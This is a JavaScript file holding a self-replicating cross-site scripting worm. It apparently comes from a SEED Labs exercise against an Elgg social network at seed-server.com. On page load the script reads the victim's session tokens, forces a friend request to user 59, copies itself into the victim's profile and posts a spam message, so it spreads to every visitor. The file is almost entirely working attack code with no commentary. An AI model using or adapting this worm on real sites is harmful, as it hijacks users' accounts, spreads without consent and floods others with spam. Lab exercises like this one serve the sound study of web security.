//  <script id=worm type="text/javascript"> 
window.onload = function () {
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script > ";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    if (elgg.session.user.guid != 59) {
        // alert("worming");
        var Ajax = null;
        var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();

    }

    var sendurl = "http://www.seed-server.com/action/profile/edit";

    var keys = ["__elgg_token", "__elgg_ts", "name", "description", "briefdescription", "accesslevel[briefdescription]", "location", "accesslevel[location]", "interests", "accesslevel[interests]", "skills", "accesslevel[skills]", "contactemail", "accesslevel[contactemail]", "phone", "accesslevel[phone]", "mobile", "accesslevel[mobile]", "website", "accesslevel[website]", "twitter", "accesslevel[twitter]", "guid"];

    var values = [token, ts, elgg.session.user.name, wormCode, "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", "", "1", elgg.session.user.guid];

    var content = "";
    for (var i = 0; i < keys.length; i++) {
        content += keys[i] + "=" + values[i] + "&";
    }

    if (elgg.session.user.guid != 59) {

        // alert("replicating");
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
        Ajax.send(content);
    }


    var body = "To earn 12 USD/hour, visit now " + elgg.session.user.url;
    var sendurl = "http://www.seed-server.com/action/thewire/add";

    var keys = ["__elgg_token", "__elgg_ts", "body"]
    var values = [token, ts, body];

    var content = "";
    for (var i = 0; i < keys.length; i++) {
        content += keys[i] + "=" + values[i] + "&";
    }

    if (elgg.session.user.guid != 59) {
        // alert("propagating");
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
        Ajax.send(content);
    }

}
// </script>
